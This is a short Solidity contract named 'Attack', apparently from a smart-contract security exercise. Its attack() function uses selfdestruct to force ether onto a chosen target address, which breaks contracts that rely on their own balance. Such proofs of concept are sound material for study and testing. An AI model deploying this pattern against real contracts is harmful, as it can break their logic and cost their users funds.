// SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public owner;
    address public target;

    receive() external payable {}

    constructor(address _target) {
        owner = msg.sender;
        target = _target;
    }

    function attack() external payable {
        address payable payableTarget = payable(target);
        selfdestruct(payableTarget);
    }
}